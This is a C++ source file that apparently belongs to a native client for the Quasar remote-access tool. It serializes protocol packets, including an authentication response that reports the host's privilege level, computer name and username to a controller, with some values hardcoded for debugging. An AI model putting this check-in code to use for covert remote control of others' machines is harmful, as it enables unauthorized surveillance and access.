#include "stdafx.h"
#include "packet.h"
#include <primitives.h>
#include "win_helper.h"
#include <string>
#include "helpers.h"

using namespace std;

quasar_packet::quasar_packet() :
	m_id(PACKET_UNKNOWN){
}

quasar_packet::quasar_packet(QuasarPacketId id) :
	m_id(id) {

}

QuasarPacketId quasar_packet::get_id() const {
	return m_id;
}

void quasar_packet::begin_serialization(std::vector<char> &payloadBuf, QuasarPacketId id) {
	primitives::write_varint32(payloadBuf, id);
}

void quasar_packet::finalize_serialization(std::vector<char>& payloadBuf) {
	int32_t payloadSize = payloadBuf.size();
	char *chars = reinterpret_cast<char*>(&payloadSize);

	payloadBuf.insert(payloadBuf.begin(), chars, chars + sizeof(int32_t));
}

void quasar_packet::write_header(std::vector<char> &payloadBuf) const {
	primitives::write_varint32(payloadBuf, m_id);
}

/* ---------------------------------- */
/* GET_AUTHENTICATION_PACKET */
/* ---------------------------------- */

get_authentication_packet::get_authentication_packet() :
	quasar_packet(PACKET_GET_AUTHENTICATION) {

}

void get_authentication_packet::serialize_packet(std::vector<char> &payloadBuf) {
}

void get_authentication_packet::deserialize_packet(memstream &stream) {

}

/* ---------------------------------- */
/* GET_AUTHENTICATION_RESPONSE_PACKET */
/* ---------------------------------- */

get_authentication_response_packet::get_authentication_response_packet() :
	quasar_packet(PACKET_GET_AUTHENTICATION_RESPONSE) {
	initialize_values();
}

void get_authentication_response_packet::serialize_packet(std::vector<char> &payloadBuf) {
	primitives::write_string(payloadBuf, m_account_type);
	primitives::write_string(payloadBuf, m_city);
	primitives::write_string(payloadBuf, m_country);
	primitives::write_string(payloadBuf, m_country_code);
	primitives::write_string(payloadBuf, m_id);
	primitives::write_int32(payloadBuf, m_img_idx);
	primitives::write_string(payloadBuf, m_os);
	primitives::write_string(payloadBuf, m_pcname);
	primitives::write_string(payloadBuf, m_region);
	primitives::write_string(payloadBuf, m_tag);
	primitives::write_string(payloadBuf, m_username);
	primitives::write_string(payloadBuf, m_ver);
}

void get_authentication_response_packet::deserialize_packet(memstream &stream) {

}

void get_authentication_response_packet::initialize_values() {
	if (is_elevated()) {
		m_account_type = "Admin";
	}
	else {
		m_account_type = "Guest";
	}

	wstring pcname, username;

	if (!get_pcname(pcname)) {
		pcname = L"";
	}
	if (!get_username(username)) {
		username = L"";
	}

	m_city = "secret";
	m_country = "Sweden";
	m_country_code = "SE";
	m_id = "AEB06EC90268D849910326C067314FD8EE2B93D4F6EC3752D4970A9EFC45AF21";
	m_os = "Windows 7 Professional 64 Bit";
	m_img_idx = 195;
	m_pcname = ws2s(pcname);
	m_region = "N";
	m_tag = "DEBUG-NATIVE";
	m_username = ws2s(username);
	m_ver = "1.2.0.0-N";
}
